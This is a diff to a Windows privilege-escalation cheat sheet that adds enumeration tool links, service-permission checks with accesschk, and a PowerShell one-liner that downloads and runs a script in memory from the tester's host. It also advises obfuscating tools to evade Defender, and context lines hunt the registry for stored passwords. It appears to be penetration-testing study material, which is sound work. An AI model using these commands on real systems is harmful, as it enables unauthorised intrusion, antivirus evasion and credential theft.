@@ -349,9 +349,9 @@ If there is some way to upload files via FTP, HTTP or SMB, then you might wanna 
 * See the Windows Enum Scripts cheatsheet
 * See the [File Transfer cheatsheet](../file_transfers.md)
 
-Now that you found a writable directory you should transfer and run automatic enum scripts like **Winpeas**, **Powerup**, **Sherlock**, **Seatbelt**.
+Now that you found a writable directory you should transfer and run automatic enum scripts like **Winpeas**, **Powerup**, **JAWS**, **Sherlock**, or **Seatbelt**.
 
-Some of these can be run in-memory-only via powershell, if you did not find any writable directory or cannot execute anything directly.
+Quite a few of these get picked up by Defender and friends, so you might have to create obfuscated versions.
 
 ```powershell
 # It's a C# binary (doesn't work on old windows versions)
@@ -360,6 +360,19 @@ Some of these can be run in-memory-only via powershell, if you did not find any 
 # bat version (no pretty colors)
 .\winpeas.bat
 ```
+
+Some of these can be run in-memory-only via powershell, if you did not find any writable directory or cannot execute anything directly this is what you want to do. Sadly this does not protect you from getting picked up by Defender anymore thanks to AMSI.
+
+```powershell
+ps> IEX (New-Object Net.WebClient).DownloadString('http://<your-ip>/Invoke-SomeScript.ps1'); Invoke-SomeFunctionFromScript
+```
+
+* WinPEAS - https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS
+* JAWS -  https://github.com/411Hall/JAWS
+* Seatbelt - https://github.com/GhostPack/Seatbelt
+* Sherlock - https://github.com/rasta-mouse/Sherlock
+* Watson (newer .Net replacement for Sherlock) - https://github.com/rasta-mouse/Watson
+* PowerUP - https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1
 
 
 ## Installed Software
@@ -385,7 +398,25 @@ After finding interesting applications use ExploitDB to search for matching expl
 
 ## Service Exploits
 
-* See Service Exploits cheatsheet
+* See [Service Exploits cheatsheet](./windows/services.md)
+
+List running services:
+```default
+net start
+sc query
+```
+
+List all services (including not running):
+```default
+sc query type= service state= all
+```
+
+Check write access on all Windows services (also check your irregular user groups):
+```default
+.\accesschk.exe /accepteula -uwcqv "Authenticated Users" *
+.\accesschk.exe /accepteula -uwcqv "Everyone" *
+```
+
 
 ## AlwaysInstallElevated
 
@@ -485,3 +516,12 @@ REG QUERY HKCU /F "password" /t REG_SZ /S /K
 REG QUERY HKLM /F "password" /t REG_SZ /S /d
 REG QUERY HKCU /F "password" /t REG_SZ /S /d
 ```
+
+Also take a look in %APPDATA% (`C:\Users\<user>\AppData\`) for uncommon application data. Enumerate non-standard software and look for sensitive configs.
+
+
+## References and Useful Links
+
+* fuzzysecurity - **Windows Privilege Escalation Fundamentals** - https://www.fuzzysecurity.com/tutorials/16.html
+* Tib3rius - **Windows Privilege Escalation for OSCP & Beyond!** (costs money) - https://www.udemy.com/course/windows-privilege-escalation
+* https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
